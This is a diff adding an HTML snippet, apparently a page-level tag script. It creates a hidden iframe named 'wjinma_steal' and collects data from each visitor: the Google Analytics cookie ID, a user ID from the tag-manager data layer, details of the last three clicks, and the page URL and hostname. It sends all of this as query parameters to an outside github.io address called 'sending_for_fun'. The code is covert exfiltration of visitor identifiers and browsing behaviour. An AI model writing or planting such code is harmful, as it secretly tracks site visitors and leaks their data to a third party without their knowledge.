@@ -1,0 +1,87 @@
+<iframe id="wjinma_steal" height="0" width="0" style="display:none;visibility:hidden" src=""></iframe>
+<script>
+    function getgaCid() {
+        var name = "_ga=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length + 6, c.length);
+            }
+        }
+        return "";
+    }
+
+    uuid = -1
+    for (i = 0; i < dataLayer.length; i++) {
+        try {
+            uuid = dataLayer[i]['ga_c_id'];
+        } catch (e) {
+            console.log("pass");
+        }
+        if (uuid != null) {
+            break;
+        }
+    }
+
+    var seqLen=3;
+    var ListForClick = [];
+    for (i = 0; i<dataLayer.length;i++){
+        event = dataLayer[i]['event'];
+        if (event == "gtm.click"){
+            ListForClick.push(i);
+        }
+    }
+    if  (ListForClick.length > seqLen){
+        ListForClick=ListForClick.slice(-seqLen);
+    }
+    element_url="";
+    elementClasses="";
+    elementId="";
+    elementText="";
+    dataanalyticsID="";
+
+    for (i=0; i < ListForClick.length; i++) {
+        j = ListForClick[i];
+        element_url += dataLayer[j]['gtm.elementUrl'] + "|@|";
+        elementClasses += dataLayer[j]['gtm.elementClasses'] + "|@|";
+        elementId += dataLayer[j]['gtm.elementId'] + "|@|";
+        if("text" in dataLayer[j]['gtm.element']){
+            elementText += dataLayer[j]['gtm.element']["text"] + "|@|";
+        }else{
+            elementText += "|@|";
+        }
+        if("analytics" in dataLayer[j]['gtm.element'].dataset){
+            dataanalyticsID += dataLayer[j]['gtm.element'].dataset["analytics"] + "|@|";
+        }else{
+            dataanalyticsID +="null|@|"
+        }
+    }
+    if (ListForClick.length < seqLen) {
+        for (i = seqLen - ListForClick.length - 1; i > 0; i--) {
+            element_url += "|@|";
+            elementClasses += "|@|";
+            elementId += "|@|";
+            elementText += "|@|";
+            dataanalyticsID += "|@|";
+        }
+    } else {
+        element_url = element_url.slice(0, -1);
+        elementClasses = elementClasses.slice(0, -1);
+        elementId = elementId.slice(0, -1);
+        elementText = elementText.slice(0, -1);
+        dataanalyticsID = dataanalyticsID.slice(0, -1);
+    }
+    // invalid char escape
+    element_url=element_url.replace(/'/g, "").replace(/#/g, "");
+    elementClasses=elementClasses.replace(/'/g, "").replace(/#/g, "");
+    elementId=elementId.replace(/'/g, "").replace(/#/g, "");
+    elementText=elementText.replace(/'/g, "").replace(/#/g, "");
+    dataanalyticsID=dataanalyticsID.replace(/'/g, "").replace(/#/g, "");
+
+    document.getElementById("wjinma_steal").src = "https://wjinma.github.io/sending_for_fun/index.html?uid==" + uuid + "&&domain==" + window.location.hostname + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&dataanalyticsID==" + dataanalyticsID + "&&element_url==" + element_url + "&&elementClasses==" + elementClasses + "&&elementId==" + elementId + "&&elementText==" + elementText;
+</script>
